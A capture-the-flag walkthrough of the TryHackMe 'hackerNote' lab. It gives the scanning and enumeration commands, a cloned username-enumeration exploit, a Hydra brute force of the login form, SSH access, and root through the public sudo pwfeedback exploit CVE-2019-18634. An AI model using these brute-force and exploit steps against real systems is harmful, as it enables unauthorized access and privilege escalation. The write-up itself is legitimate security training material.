# hackerNote Walkthrough
## Intro
Welcome to the hackerNote challenge, here is the link to the [room](https://tryhackme.com/room/hackernote) on TryHackMe. <br>
This is a challenge about web exploitation to gain initial access and then exploit a software vulnerability to escalate your privileges.

Whenever you feel ready click on "Start Machine" and connect using OpenVPN or via the AttackBox.
Let's begin!

<br/>
<br/>

## The Challenge
We can start with a port scan:
```bash
 rustscan -a 10.82.139.147 -r 0-65535  --ulimit 5000 -- -sV -sC
```

It shows us 3 open ports:
```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 10:a6:95:34:62:b0:56:2a:38:15:77:58:f4:f3:6c:ac (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0njoI1MTN18O8+mhh7M4EpPVA2+5B3OsOtfyhpjYadmUYmS1LgxRSCAyUNFP3iKM7vmqbC9KalD6hUSWmorDoPCzgTuLPf6784OURkFZeZMmC3Cw3Qmdu348Vf2kvM0EAXJmcZG3Y6fspIsNgye6eZkVNHZ1m4qyvJ+/b6WLD0fqA1yQgKhvLKqIAedsni0Qs8HtJDkAIvySCigaqGJVONPbXc2/z2g5io+Tv3/wC/2YTNzP5DyDYI9wL2k2A9dAeaaG51z6z02l6F1zGzFwiwrFP+fopEjhQUa99f3saIgoq3aPOJ/QufS1SiZc6AqeD8RJ/6HWz10timm5A+n4J
|   256 6f:18:27:a4:e7:21:9d:4e:6d:55:b3:ac:c5:2d:d5:d3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHKcOFLvSTrwsitMygOlMRDEZIfujX3UEXx9cLfrmkYnn0dHtHsmkcUUMc1YrwaZlDeORnJE5Z/NAH70GaidO2s=
|   256 2d:c3:1b:58:4d:c3:5d:8e:6a:f6:37:9d:ca:ad:20:7c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGFFNuuI7oo+OdJaPnUbVa1hN/rtLQalzQ1vkgWKsF9z
80/tcp open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Home - hackerNote
8080/tcp open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Home - hackerNote
|_http-open-proxy: Proxy might be redirecting requests
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We can now go and take a look at the website `http://IP`, looking at the page source code we can spot a JavaScript file called `main.js` containing:
```js
console.log("Hello, World!");
async function postData(url = '', data = {}) {
    // Default options are marked with *
    const response = await fetch(url, {
        method: 'POST', // *GET, POST, PUT, DELETE, etc.
        cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
        credentials: 'same-origin', // include, *same-origin, omit
        headers: {
            'Content-Type': 'application/json'
            // 'Content-Type': 'application/x-www-form-urlencoded',
        },
        redirect: 'follow', // manual, *follow, error
        referrerPolicy: 'no-referrer', // no-referrer, *client
        body: JSON.stringify(data) // body data type must match "Content-Type" header
    });
    return await response.json(); // parses JSON response into native JavaScript objects
}
async function getData(url = '') {
    // Default options are marked with *
    const response = await fetch(url, {
        method: 'GET', // *GET, POST, PUT, DELETE, etc.
        cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
        credentials: 'same-origin', // include, *same-origin, omit
        redirect: 'follow', // manual, *follow, error
        referrerPolicy: 'no-referrer', // no-referrer, *client
    });
    return await response.json(); // parses JSON response into native JavaScript objects
}
async function whoami() {
    console.log(getData("/api/user/whoami"));
}
```

Here we can find an API endpoint which executes the `whoami` command.
We cal also check for other hidden directories:
```bash
gobuster dir -u http://10.82.139.147  -w /usr/share/SecLists/Discovery/Web-Content/common.tx
```

```
/index.html           (Status: 301) [Size: 0] [--> ./]
/login                (Status: 301) [Size: 0] [--> login/]
/notes                (Status: 301) [Size: 0] [--> notes/]
/render?url=https://www.google.com (Status: 301) [Size: 0] [--> /render%3Furl=https:/www.google.com]
/render/https://www.google.com (Status: 301) [Size: 0] [--> /render/https:/www.google.com]
```

Let's take a look at the login page.
Here we find another JS called `login.js`:
```js
async function login() {
    const username = document.querySelector("#username").value;
    const password = document.querySelector("#password").value;
    const button = document.querySelector("#loginButton");
    button.disabled = true;
    document.querySelector("#status").textContent = "Logging you in..."
    const response = await postData("/api/user/login", { username: username, password: password });
    console.log(response);
    if (response.status !REDACTED "success") {
        document.querySelector("#status").textContent = "";
        document.querySelector("#errorMessage").textContent = response.status
        button.disabled = false;
        return
    }
    if (response.SessionToken !== undefined) {
        window.location = "/notes"
    }
}
async function forgotPassword() {
    //Based on username, find return password hint
    var username = document.querySelector("#username").value;
    const response = await getData("/api/user/passwordhint/" + username)
    console.log(response)
    if (response.hint !REDACTED "success") {
        document.querySelector("#passwordHint").textContent = "Hint: "+response.hint
        return
    }
}
function getCookie(name) {
    var v = document.cookie.match('(^|;) ?' + name + '=([^;]*)(;|$)');
    return v ? v[2] : null;
}
function onLoad() {
    const session = getCookie("SessionToken");
    console.log(session)
    if (session !REDACTED "") {
        window.location = "/notes"
    }
}
async function createUser() {
    const button = document.querySelector("#userCreateButton");
    const username = document.querySelector("#usernameCreate").value;
    const password = document.querySelector("#passwordCreate").value;
    const passwordHint = document.querySelector("#passwordHintCreate").value;
    const user = {
        Username: username,
        Password: password,
        PasswordHint: passwordHint
    };
    document.querySelector("#statusCreation").textContent = "Creating your account";
    button.disabled = true;
    const response = await postData("/api/user/create", user);
    console.log(response)
    if (response.status !== undefined) {
        if (response.status !== "success") {
            document.querySelector("#statusCreation").textContent = "";
            document.querySelector("#errorMessage").textContent = response.status
            return
        }
        document.querySelector("#statusCreation").textContent = "";
        document.querySelector("#statusCreation").textContent = "Successfully created a user account";
        document.querySelector("#usernameCreate").value = "";
        document.querySelector("#passwordCreate").value = "";
        document.querySelector("#passwordHintCreate").value = "";
        return
    }
    document.querySelector("#statusCreation").textContent = "";
    document.querySelector("#errorMessage").textContent = "Something went wrong..."
}
```

Trying to submit some test credentials and capturing the request with Burpsuite we can see that the username and password are passed as JSON objects in the body:
```http
POST /api/user/login HTTP/1.1
Host: 10.82.139.147
Content-Length: 37
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://10.82.139.147
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{"username":"test","password":"test"}
```

It appears to be also a function to register a new user:
```http
POST /api/user/create HTTP/1.1
Host: 10.82.139.147
Content-Length: 53
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://10.82.139.147
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{"Username":"ta","Password":"ta","PasswordHint":"ta"}
```

Finally in `/notes` we find `note.js`:
```js
function addNote(note) {
    if (note !REDACTED undefined && note.noteContent !== undefined) {
        //add it to the page
        const noteDiv = document.createElement("div");
        console.log(note)
        noteDiv.setAttribute("id", "note"+note.noteID);
        const noteTitle = document.createElement("h3");
        noteTitle.textContent = note.noteTitle;
        const noteContent = document.createElement("pre");
        const rule = document.createElement("hr");
        noteContent.textContent = note.noteContent;
        noteDiv.appendChild(noteTitle);
        noteDiv.appendChild(noteContent);
        noteDiv.appendChild(rule);
        document.querySelector("#notesDiv").appendChild(noteDiv);
    }
}
async function createNote() {
    const title = document.querySelector("#Title").value;
    const content = document.querySelector("#Content").value;
    console.log(title,content);
    const response = await postData("/api/note/new",{noteTitle:title,noteContent:content});
    console.log(response);
    document.querySelector("#Title").value = "";
    document.querySelector("#Content").value = "";
    //delete notes, reload them
    document.querySelector("#notesDiv").innerHTML="";
    window.setTimeout(getNotes(), 200);
    cancelNote();
}
function noteDialog() {
    document.querySelector("#notesForm").setAttribute("style","display: inline");
    document.querySelector("#newNote").setAttribute("style","display: none");
}
function cancelNote() {
    document.querySelector("#notesForm").childNodes.forEach(element => {
        element.value = "";
    });
    document.querySelector("#notesForm").setAttribute("style","display: none");
    document.querySelector("#newNote").setAttribute("style","display: inline");
}
async function getNotes() {
    const response = await getData("/api/note/list");
    if (response === null) {
        return;
    }
    response.sort((a, b) => (a.noteID > b.noteID) ? -1 : 1)
    response.forEach(element => {
        addNote(element);
    });
}
```

Creating a note hit the API `/note/new` endpoint as we can see in the code:
```http
POST /api/note/new HTTP/1.1
Host: 10.82.139.147
Content-Length: 52
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://10.82.139.147
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{"noteTitle":"testnote","noteContent":"testcontent"}
```

And with this the enumeration is completed.
Now moving to exploit the challenge already suggests us to use an exploit and list purposely made for this:
```bash
git clone https://github.com/NinjaJc01/hackerNoteExploits.git
```

Here we need to change the address of the target in the `exploit.py` file to the one of the current machine.
```bash
python3 exploit.py
```

After a bit we get the message REDACTED.

We have now an username, we can brute force the login using *Hydra* but first we need a wordlist.
To create it we will use *combinator*, if you do not have it you can download hashcat utils from here https://github.com/hashcat/hashcat-utils/releases.
Also download the task files as they contain the wordlists.

Now combine them to generate the final one:
```bash
./combinator.bin colors.txt numbers.txt > passwords.txt
```

This gives us our final wordlist of REDACTED entries.

Now we can fire *Hydra*:
```bash
hydra -l james -P passwords.txt 10.82.139.147 http-post-form "/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password"
```

This shows us the password:
--> REDACTED

We can now go back to `/login` and submit the credentials, once logged we see a message telling us the user's SSH password:
--> REDACTED

Let's SSH in:
```bash
ssh james@10.82.139.147
```

Time to get the first flag:
```bash
cat user.txt
```
--> REDACTED

<br/>

### Privilege Escalation
With user access to the target system we can now think about escalating our privileges.
Trying to run `sudo -l` to find if we can run any command with root privileges we can notice a weird thing, while we input the password we see `****` which is not the default on Linux system.
Normally when entering passwords you get no output at all, at least until february 2026 when `sudo-rs` on ubuntu shows now the asterisks.

Anyway the room is older and do not use rust sudo, this is related to REDACTED  and we can find the exploit for this vulnerability here: https://github.com/saleemrashid/sudo-cve-2019-18634

We need to clone the repo:
```bash
git clone https://github.com/saleemrashid/sudo-cve-2019-18634.git
```

Then compile the exploit and transfer it to the target either with `scp` as suggested or with `wget` + local python HTTP server.
Once on the target we can run it:
```bash
chmod +x exploit
./exploit
```

This makes us root, we can now get the last flag:
```bash
cat /root/root.txt
```
--> REDACTED

<br/>
<br/>


Congratulations, you have successfully exploited all the vulnerabilities and cracked the passwords to find the get your way in and find the flags.

Hope you had fun following along and completing the challenge.

Catch you in the next CTF 😃 
